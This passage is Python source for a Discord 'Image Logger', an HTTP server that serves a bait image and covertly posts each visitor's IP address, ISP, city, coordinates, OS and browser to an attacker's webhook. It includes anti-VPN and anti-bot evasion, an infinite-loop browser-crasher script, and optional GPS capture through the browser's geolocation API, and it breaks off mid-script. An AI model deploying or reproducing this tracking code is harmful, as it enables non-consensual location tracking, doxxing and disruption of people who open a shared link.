c2wvcY5hz2hjToOHiSoUeQe5+M+ij6b4U8vzE709ZR69ddWtp6bCLydiSqLAOLIbzq75jzJPSKIsOlOb3upAAP8RJEdPC000UeLZcai0rWka3NwNk8p6LA6jck9cA+ZuHvTq+KlJaiVF0EX8xJJv0AiII2IOBDZxzUYVl06hOlUIImGUS5uD3gbfLGuez+czCDXUqGmNipFJZiLaR4jW/SJF8MOhogBoEncRp6vrt1o2E9nYlLmbEFITGqiClUi8ZZmOKfd1kGKlZniFJ8nWytSjUp62BU6kIRhJHxMCYPTaLDFccay4o1FCOdQAJbsd7emxGLa5S4a2ZUJVrtKmClTQrQBYh1E32t+3CpzVwn85VoOup6ZhSWkx5hdj5jDEW7epxnNurQqVe7cctdwet+XStJfs5KpaZPfEGbyOmkXi/eOkTS7+X5b/wBTnP8AEf3YzGn8hUf/AFA+g/fjMWlnifL8qa7f2n/dt+f/ADasH7KuDNlq7CqgLkMC36OnT5RPQzMjf5YOfatzOuXyVSktVVr1NKooI1AEjUY3CwHEkbxipP5bzWWFR6VdlNUBWY3aJJgM0kb9MActQevWA1FnqGSznc3JJJuevqcNqbAOY15ouEwkC+nrnRjhWbrZrMr4rli1TxajMbvpg3PbygBRYfK1ycKL0aYdiqLVFjvI7dIPpivuHcopSVawqkvMKCQJOxOkCy3i5OCXFONjLU1LedpIppO/c32XqcKOq7ZQyzbTb1atbDYYNNEuEa33sLAciFdeUm1On8oIxgsGBF/KR8uoOEnmLgZ8F6NM66TMragQWUAizA/rvhR4lxKrmCTXrNf7qEKo+UGfffETh/A2q1qaUqih2PlLmIgEzqHYAnbDTWFyCxiguvA2CCR1E+UeXHS1XHyvwqhlkXw0CrAJJJJ2kkmP1mO3bEzi3N+VSjWC1F1im5UMrBWIUkDVp0mdv34ReN8z18tQCDQXhh4imUYhVS1oMCTG8xIwmZ/Ijw1r18xNSqocbOWm33bgiIJJEHDBTKZ9D7+uVLu2VlG3MAfHSrF5a5yy2YztGpnKtXLeEmiklYjw2GpWDagFCvKiZEGFuIjDi/NHCM7XfLMWBfy+KC1NKpPl0h1YFuwLWP3ScfPmY4g0UwIYAAmbycFMlUWsDpEkC6xcf6euAC9ZuNfLJEXSN9NenzqxeO88cLo1HyuYyjZr8nqVKdMlVIRJHkAc20kBNrhAb4T+bfBp5ulVy6haZVaoCqiiNR2CKBGmB3PXCdxr+dNyW+8SZv8AP0wS8SrVyqtpZhQBWQpMLIgkgQAJIkx0xMAgj1z+FU7RZKVINibz8PIjbWrv4FxCVWnrARipEyRvIEAxBMXw7VqYKnyBpEEExbbeMfP/ANnnNIpMlOrBCnyE7H+oZt7T7dsXxUzqeGtRj4AkNLFRbqD7jphdKY3uK1HwFQpIsfnvYX8d6V6HLpyreIivmGWmadCkwQBAW1XYE2B+8TIvE2ASxy46Vquf4hU8q+YspuX6BAb/AKKqN/Qb4beaftCoIrJl31vESv7+nvv2HXFd5LOpnKwXP5pokBVIaJaxI0CFYWAlTM3OIi8UaV5StcDw+gtQnj3Da9REreGCa9RmC09XlDEuoMxJEkao2AviNxoZpETLkyop30iNpkEncAR2nFm8wqmWp00RhVAOlVEBgqL5mPoAPS5AiSMJXNOco+G6PrDMPLKkiQLXjSY98OkAC1eSGJWp5KXUZgJIiCTJid4gEn3TJAFpCgq8tZkrUYAGCt97RsT2G4+eGQ59qVSkyg2dZKgtADAk/wCmIZo1qeWHg6QzAE+GDIA280ectvPSbYT1qEMCbmZxULUBFaqsPgVOIeQsrUIJiAmYlOoJ0idOBgggW7mOMVanm8YBTb4bGSBeFkHfftiZluG1WAq0606r6lc36fED7jfA3l6nTzVGoTVKVkMh58uk3Vivwkbg9bbg494VzCmVvVeKdUSBcgN5YK9ACDfvE98Q6lSFlJF/Xw4V6Ydk8wXmjYRMpCbExIgneJBPOdqbsvTrhGV8zUI0HSAJudoaJHf6YSqmdq5emE1afDkatMbgA2MwLWE9Se2O/FeeaJUmnVA7i8j6WOEni3G6+YEyQAYDFoDD53xQJcUe7SheYbQpKgDmi2txy8T52pxr5pcxX8VPOrBBBIMaFARTBk6nLMZvGoHcYPZmmQX/AECzR8jf9n0xVeWqVvzSUmak1MEhbiZOosTsR+EDFh5bP1sy6tZvKV0KDomQCehLagd+5GHWMShmS5qo+v6bWjegOYJ/HhKWIhtIEkwCYEgAxoTJO8ySJSkHuU+EeNWgNp005dhvp1HSPff5ThI+03OCpnFOXGksWJGqSSzASYNpYMY7X64c+JcKrZWg7BKwqliHcSqMpHwiDcE2vawwncncORqwqVXJBILO3QGJ3tYE2xkLcRnW9GhOu86W9TWoW1FttpK5CgBImwSQpZ1kk93LKZjhmuM/2XzPdPx/7Me4sv8A2lyX/wCX/wC7/pjzCP4t3hTUNf3Z/m/4qo7ilfW1vhG37/fHCjRY+YA26jpjoyXPoMH8jlwqgel8ejCJNeTSnNrRnlfiLVF86ltESdp/1wq8ZzjVsyzCSJ0U4vYGBHcnf3OH3JcO0ZR3RbaWZj6kE/qgWwN+yrha1KhdgCwYIs9OpI9bj6YUQlIUpSRHD11rZdzuIbbUraSeECR5A9ZipHK/2V5vMjXUqLlk9QWc/iBPzwdz/wBhrgTQzmpr2qU4n+8rGO22LgyiBVCjYC2Bb8zZcElsxRp05gF2Wah2JUFh5ZsDB1GYtBbg4qstyCbD164V82/yFUSpUy1em1N1ImR8JixtYgi4PUYI5Ll2EkWYwVc30k7dIuOsfqvbH2pcBStSTPUlD1KRGrTvUpkx06qTqHYasJ2VrjTYEECCJFo6EH9oxdb0x3ZrW9mYVpxtRmFDTlz0sfGRrwquONUKy1D+UfFAGqNx0Nt7dfbA+nVKkMpKsNmUwR8xi1eH5OnXFZ3eGRQUkqSWJiwiBER/e95C8zcMrUyPEtIBB8MCQRO8SMAU8EEA70N72aHCtWckjW0zaTcqGaBrY9TWcPy2XeilR6Cu7hS9So06maJNtRHmMRbG1OovDaoKFkSqD8aGRG6zsyGQLg73wQ5UArZcKx/OISGIJBI6EwQYj9WNOZODMMufKtRad4YtN9zCwAdpYdBh0pcyhVj5favKtOeywewK1NqTY5wohZB1GVa0pHulIyJgaLI0D5rJ0amutknVZDeLQImAQQzIpE6YJkCdO4MWX3ljgX5UQrVUUC2kvLwOyzthepNLALSKsPu02aZ/vajidR4dVBBNGoq9zUW30SRhdUKNx4VtNMPpaUW3CQP2ghaojWSEX8YPEU3cQ4NlFqKnjPUVDocLoQA6gL1L2BsQqSLiZGAfNfGKKxQytFadMfEyEMajdPPuVG/qfbBrI5bxqYR2zDgjSCIYpJ84PiUyukEBiZBsfTCxxXINkqpIqBtNqbA+aSCCCL6SouR6r3xwECQOX5VRwMl5pguEqCcxIIUiJnOnLGnBQBzQAVSFE7w7mRmoLTrwHYEKzG7IfKGAmZHXaYnzYAPzCETwqlPxhEKzCNS/dJkEyRP4YFpVapVaqSA0rZbFiYAAg9epHriTWeq58Oomi/lpaNIPsPve9zi+ZR30pFzCYBpJQEiVKJRutQ0NswyjMDBSCrvZY7uY98hxUMq0APCGokMGFrfCdZXy/Ed94xzPAi7FhUSpqJI0ET6nSxUH1gm+CvDuT5cNUSoKWkMAwA1HqJ3IB9AT+thp5VCEZY0KCVK9Bp02+6BE9MchGecpBqHcczh1oGMaWEkBOcgpKUgGMoKO8qdcxUCdYIJqtxWqD80pMzp0lb3O3pf8cd+NZoM+kNqSmAqX7KA31M39sHONZnL03GlVdtUt5VkzuSViBER3kmNjjVOHZeoVamiyd1klTIPmF/um+m3YgSDjs6gRN48fVq2WWEutLaw65Uog5VAoUQASE94ZSq8qGaxANsplYy+YRd1k98M2XzCUSRUBNSBECdMgEAnoTI22jfBReGU5ULTX82w0kIsybkE9QFufcReDgPm+GVINaSwdDVhR50JAPmWZKDbUJAgTGLqc7RBQfd1MRe9EYSfZ7gUrL2uYpE+6IF+9IBJzCP3bz3pCedIMQE1m66TBi5ET7dfXrh9+xvPVQxCKAzypLTaNLMY/ukYrfIVKrKaiUWZad2b7ogTBPt03xbnJmjLUmFd/Dq1kIJI2NSKhYgbK2qBF7m1sU9oOIASRufl9q72UlSw4DeEEBOupBmOAiTGuh1FMv2l8cp/ye0N/OP4ak2kCSWHcCN8VHmeKCnSNIW0gDaJO5Ptv9MFeZsoXpeMWJQu6UkPVYu3pJ1gAWgk31YUeKN4lR2GxgA9wLfjc/PFRgi5lUoWMq8oCR641zuKRhUOssqulSRG/eCio8YgIE27ydLiR35c3c49xM/kvGYY7MVkyuuWWy35usx/RUD5uk4O06OB9EfmKv93/ADpg/QpSMMITTrSJFT8rWZkFPZdOk9ekE/wMAeSM1VpVXo0w3japQAgeZbGZtFh+OGLJUYwt8yVGy2dWvSOlxFQR3BI/ED8TiXcOEtykejz61oO58gcnS3gbVdWQL5yg9GsWpP8ABV8MwrxZtLEBgp2IsfkZO9Ll+jlgFpamJbU6rBZyREMI+CIH9W3TATlfmxarrqfUWSYBjSN5Kx7DcRO2C3F+eKNGQrpq0kj7xLdBCm1+pOMvNlVApNSVpV3fp84+1NlNNSAOouLr0Hpih/tTehlc4BTqEVWINRBcBTsx6BjvA6QbdbA4nzXVyympqFSkULh2uBEyBpFjEW9Rj524nnqubzFSs5mpUYsfT09gIA9hizayBmFVWl3DARHe08PIj+u2rjy7xADOtSqAArIsZ1FSCY9SJti0OcvBzFWrTdg0onhkGYEEmPmbj1XFLcAqGhXWtUAqEjreOk9b26i4PrixeJ58cRZDlwKLJZdJiG3Pyaw07RGBOpClZldTWrlXiWClo5VALiTdIKkqE73iJFgD3oiCkVOFVsvUIBYLPxU2IIna4v8AvxLfJV4kVqjBiBOtutr3w2cMpVC+iqF1khQSYWbDzArttNxg+eWkpEVRWy5VW866iyKZsoW7PIn136YTdfVmgaVLXsxtGX8RGYgTaZ4i2l7JjX90Ewa6Tgj1XqUkreCEUGCP5zoZIg2kAC9hgZU5dzYJpUAtXW0PTpGZ69bgb3JxZnMHEaPiMaOVRtPXSbnuVbyqJ+7GF7M8Tb87VbNCkY860wqaVP3bi+wEaQDAwZp4qsImgY5hLR7ZxSwiAAhKCVJEXSkpVlSkpuQoaDaVV1pcIzGUyqflNemrVCAKagmowmL1AYWAI1bwO4nA7jdLJlXpsUU6TpVXBKHe0wRJuWO/4YnZPMZWrRcZytqpQfAXWAdRG8jyKJBmCDtvfAzgPJXDsxTdmzZplSdJJUqY6RGqP6wkb/MwxGWc0k6A7CeA+80ljfYuVKOy/sWlFKlpAyLWZzAFXfJCbWTmAVmNxGUDw/hi0mpSfFZhrWA0JYR1HmYdD0E4b8hkXrNppKzNHQCB6ysWHvHfGDiPD8iwapWTMsL6QlVp9SH0J6SAfY4Fcd53zuf/ADeUpLlMselOFDf2jA1ewHyxUuKUe4nxM/LSpwzD6SEqeKif9mxKekrTDqhHEpHFfEtzXzeMplmySOKlU21IxKp3Orq5sCF8vl6knC5muL1UyimpTCMQFAA3Nx7KkCY67fDjMlwundmZHr9XGwbckzbVJm8n06Yn0Vo+CaVar4oMBjvBPlBlRYgx5jefpg2GaygiddSd+XqeetA9sPIbeQp1AW8DmDaSFdnYZlqyjvKhIISYTICiSAar0sTcmSbk4YeT8hVq1ooIXqFTpEHSI3n5A7emJ2Q5CzRq1VChvC77NIkDr54IOjf2tNrcmZDLcPpE5iqviVU0xTvpTtKbMT1noB0xR5WQQdfU0f2cFZw8gFUaQCSSbjnzJ2G4VFVpm3JsBDK6l0KkGlqQI17SCFiRtczYRLytdlroUcC6GyghQoINiTYiFAnfUehxtzcqpnGddIRQ0MSCQNVtRHlIja+84i/yjCJ4SFSxsxF2I7AiyjcuR7A4ewgaWyFrOpEROYxaBwvvty1pvH/rSwym+VWYkwkdpdSlcyDBBNylMTARUviPE3CtQVBBqaiFAUMxIbTC2CKYdj3IHpiY1X8npeJVWdYKozi20MwHXT8QI20nc7acK4SatVVpS7gangfdAMsZkiXNrgRq3JYmXzbxNKjL4ir+ZphaSiy6gDDegnU09gO2FsW2tzEhDgAG4mwSBJGs2Fzx8hTmCfQxgCGL630JUYCbDdSiABoAkg3knXmHPIMtRW5YXCLcxAAMdB0k4AcN4LVzOZWiiedmE+g3JMbAC+JnD8rHhMXLGqrNGneNFyTefNEWAEAC04tLkHhAoDUAGrOQah6IjeaAe/T+DhnE41YdKcoGscYJm+2h0HKTY1jj2aynBpdDhVJvsmUjLI34AKMEiYEqSBz/AP4vo/0z/wCEYzDZ/LVL9NfrjMIT/GaDGI/d+H5V8zUxFOoDudP6x+7DHw66rO8YC8PybFgdJbrGJvEGdAJIk9B0xtoEXploRTBXzyUF1Nv0Ubsf464TONUKp/3it5fEMKvWI7dAPXqfXDjwLhKU08bMHzkarz5F+Wx6+mFDmfiPj1CVBCLZAe3c+p/di7pBbv4D6n6U04R2d/AfU/Sg78RjqR0Mf+Rhy4E/CfCDO1bM5hjC5eSl/wCsVsE7mTaYBwgV1wf+z5IzLGJ0r+th+7GSsE0nhwXHQ3x33G9vlT5zpwofyVmHSmiEaCRTWBAdZAHYWN+04qLh1GBqPXbH0NTyIr5WpQ2V0ZPaQR+BOKJz3DauVqtl6y6alPfqCDcMD1BGOyka1fFoh4HbQeG1aasFuD5so2oEAgfW+x/jpgBXr6Y9T1wd4Nn1RPDqLqUzfrfve/7MCdTIpjALQXrqyxvz2/rVu8I47lKuXCMoFUAKC+ogiRuQCYFzBkDp6S6/EKDBBS8Cg6MymULKwjSGBC3H9oDf61fks6u0kKNpAJ/DDPlUP5O1U1AadMyUAGr+1tIE2noSMZCwoGCK204dr3go3PGRexABBEGdDPIipfEeFOtKRRqI4++o1JUG8zsD6gkEdsJfEeXauaYRSZKhYLPl0mdpM2/jfDdw/wC0pcvSdArOAvkXUd4vBWCFiTAvN5wKzfNfEaZpVq9V6OXrk+GadRmI67OxlRt69CcHw6VJNgL8bfe9J4oB2Q6dCIhQvY2jzsZi+WBQXO8kV6LGgxLFTA0g3PTrJE7fhiPV5TzqykvTSQTrsReNo9OsbYeKvNWey+lqtbVTb4KhXUDP9rY+ljhQ4txyv5vBqL4cSCBc/UkTvsO+GGw+onlry+vjS/4XAse8kJkQckgqBsqbJI5iZ4niW5gylHLUqQoZY1czpAdnIs28i9hH4N0wupSzubotp8KCSrlSPQxqkrsRYYE8Yp1jBryxPw6ik+vlBsO/TacT+VeKjLeLSEVNcFApgneLQdx0nqL74PhWmwsdqbbn1NL+0MTi2mlM4VJSbAJJA1I0FiDEx3ykJtBsTJocLq0aQFTQyL93xGCxcksdN/ba18MPAszQSn4lSsadVJ00qSajBkapMaJGxjUOmAmfzIZ5aoCbBY6nsiXki3m8x6AjptwudJSlRKq8aiwbU0Ek6Vuzt62HvhjGttlAWiUg8T3iOMH3RuDqeVR7GQ6xnwxg7rypTkBkEhS47xFs0HKkftKJsbos3lWnm9LCg1Xw5Mw1lQEmTUYltXznuVziFJ2ZYNRh4YNRmlQjX1ATACjpHTqcH+N8zU8s0ZbKpTWGH50q9RyQBJAlZsAADaT8lbO59qoXUAqqQ0L1I6mTYdY9pxXAoeU5nSgCf3rwNJOhnr9CaNjsVhksKQ84qRByp7sk3ANlBI0NiYn3QYmQM0LW1taGbyovrfzE9jF+kb4YuCcDzGYFSojKulNTVGWSY6KDIG9hBk36X15M5ZrZs2U+EDOoiA3YmOi9O+4HXFy8DoUsuNFNk0TpdyRLVDACj27eo6zgrzwQT2Z71+9wA2GgG9hoIE8F+1UGgFi0AhsSBmJupckqVsElRzLN8uWCa75crjLrWpilUZyD4zFvMFB84v1IAEsbWAHdDz3FNdV6ypppk1IGsgiDpABIkQikaotf2xYnPueUMctlRSXXepVQEkXklj2UkEKJlo2gwtctcD/KaqiiGNJQFQwYsNOqe0TfrJPbCmDKUsrcduCCEi/eUSPMbnlypzEqLrrQaOQyFK/hQBrwSSDCQLp7pBSSTXThNKpVWmYsFAEA9Yn6wIHYDFt8E4S6UQrnTrEuB8XSFnoImesnEA5oZFaeWpBXqG7EzEsY2FyentGCme4utOqEqVERXQkG4KkQN7i8noNsUcxAW6pbh7x9fClHlL7BvDsJhABynUqCf2oixPvcJ00g6/7LUe7/AOIfuxmIH8pZT/1lX/3G/wC3GYB+IHo1aMT/AHrn8q/vVe08uAsQRex/jbEPM5DxM3TVxYadQHUAaj9dsO/8jAXMk2N+o7YGtl/Cz9NiIR4AJ7FdO/vGPTAg6cDQWoIPQ1x5qCvlK2kBIAsbEgMDipq9I+wxZ/MmefNVVy9EEqWgD9Nu59Bc/j7V1xSiwZlaxUkEdiDGKLT3RUrEJFAswRPph65cy1OlSJW5MebqbnCPXTDJyrVCrDHyk/TCYMKons5QS9cba8P61cPLVQeGJN+vzvhY+03glGuEqzpqJ5Q/6S7we8E29ziPk+KvSBUR7+38DEPiubNVDJ/jp+OJlI94X51orwYWpSlacKQeIcGZezr3HTEfLUqnlRYEfeMXH0+VsM1NxpqKeot72/1wJNMqTFr3xQJSog1nO4VCVZkmpPCso4q63YEDZVH47WMdcSOP8UegqGm3xkyGWdgLzP4Yzh2WLCQZ+eDVbgC16Wl1bvI3B741BhmnGChIE6ieNVC32u81I5zSdw0UKrDXRJYk2VvLa8kEyB3vH6sNVLhNWrmsshpjwlQ1FWQRI6EdAszG3xeuJfL3La0pglwYmRFhsD6T0ET1nHTPkjMs42SmNRkj82pJePUyMIu+zlNMEkd/QAXj0Kbwj6lkJIAGpOUAkjSYA36TNzEzK5x4hUq5SlWGl01PSqJoGkaWJVSPWZBERpid8IdfJsoDZbXFyaTNJBIuF21CAf61tjh35e4jl6ObqZSv+cylZ2KaxZlJJk9QysZ7w2DHHOQsm9M1cq3iAGWVqukpexuQVv7dN8ZLb/ZQNtRsYPD60fFMtrVlNjpMQAZmCQLG9pElOU6mKq3Kcdd9KlVZhuriSSNzPQ/K3rix+WeT6Waps1VxQpW1j4CZvEiOxm8458C5HYutVqDVW+47GxO0s0wY+tsWceB0QtPWVpaFuqt5Z6mWue0nEylZ7u2vqYqq8c6wgtPO5iqwIyqgRcRxPum0byTNV1x3l7LUC1LKIgeABU+IzG1jEdIwC4Tks2KbqkU6xgtWkO5WQNIUwqyStlnFw5/I5Et5ioZRp0oRNr/Ct5+WBvHsvSy1EPl1Aq2aWEuFNp806LxeB23wFYEKJIPx9dDVWcUh1DbJSq9hMhM2vY/FIAE8KqzjnKrUdL1xUp6lMFmOw3J1SRE+m+JnK/8AJdJ6ZqMKjEgBWlQpMXkm/UQBfvgdz1zHUzJSkamtgdInYW77TMEn09sLTKtJtTFapEaQrCCdyTE+Uetz2jDjaFLbAUtXEJ4j5XM/GqvOgO5+yQI/SOA5YJ2BgrzBMDu3KiE20q9uZeYcrSpmkjtRI0gqoCrDQSSYva29yeuEfinPJUPlKUvR0kq7IoAE9zte/wCrCEGq5h9bSzE+tvQYYuD8EqO48T82nUsJJjeB036/TBhhMO2krxTn+UfLeeunPhmN4t9RDWCazAGSpYkT+9tF9AVKVBI1MVK4XQfMBgp1rUEVGA+ImzAD7okx2E274tnk7I/k4KO2ktEUx02uYsGsBG+FijxjLUKJo0pDsQCQ3QSYgXE+pv3thm5SzS1lDFVUU7T1djeflb69MJfiO2cSVQIskCwA9b7madxDRawywQdRmUYKlEC08BJgACwMmLkrf2jcZ/J80rUtXiKAem4HraIIme+A/J/NyV8zV/KxPl0t4g1aQfMNIEi8bWj9cf7Uan52p+cBJYHUPuqIJBnoF8tupGEmotMUaqtUKktqZQBJtAS/sCR02OxxK8Iy5hu0vnKiOUchvEpE6SYExJsy8vtOwVlyBoGZhUxmAzmMswpYTB7iZKTcU6/7WZT9Kj9B+/HmKl8F+6/TGYv/ANSN8T/7fvQP+0p/uh/Mr7V9WVNx8sBOe/gof3v2YzGY1WP0qfW1LYX9Mjx/0mlrlP8A45fZv8pwlc2f8VmP+a/+Y4zGYYd99XQUy/756Clitv8APBHhWze/7Me4zGc5vVcN+k86a8vsP7P7FxtX/wCGP9o/5sZjMRiNvXCtbFaCl6hufY4iVPhqf21/+2MxmLN6Us5p5/6TU7gHxn2w9cG+774zGY02KnD+4PH51KyW9T+036zhV5i/nK3/ACH/APiq48xmGsTt/iT86ph/dT0NLXOXwJ7t/wDTD3wf+br/ANlP8y49xmPFu+6nwr0B/XXerXzqZwzYf8xP/tiRzB/PN8v1DGYzCiPePrYUY/rH+U//AEot9n3/ABL/APLb/MuI32o/G39hP8zYzGYOfcHX6V55/wD8QV/gR801TXG/51/7RwMTbGYzHrf9mOg+Qrwh/TDofmaeeSevthp5/wD+Go/8lf8AOcZjMeYd/Wz/AIhXucP+qNf4XP8ASqk/K/zC/wDMH6sMafB9cZjMMe2f046Cp/6Kfqf+Y/I0s8Q/4n5Zf/5DhczO/wBf8xxmMxo+zP8A8x/rVWR7d1c/9c//ABtUNxmMxmC1k1//2Q==", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
